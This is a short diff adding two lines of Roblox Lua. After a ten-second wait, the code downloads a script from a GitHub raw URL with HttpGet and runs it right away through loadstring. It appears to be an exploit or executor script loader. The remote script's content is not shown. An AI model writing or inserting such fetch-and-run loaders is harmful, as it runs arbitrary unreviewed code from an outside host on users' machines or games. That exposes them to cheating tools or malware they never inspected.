@@ -1,0 +1,2 @@
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kunai7685/Fection/main/Main"))()
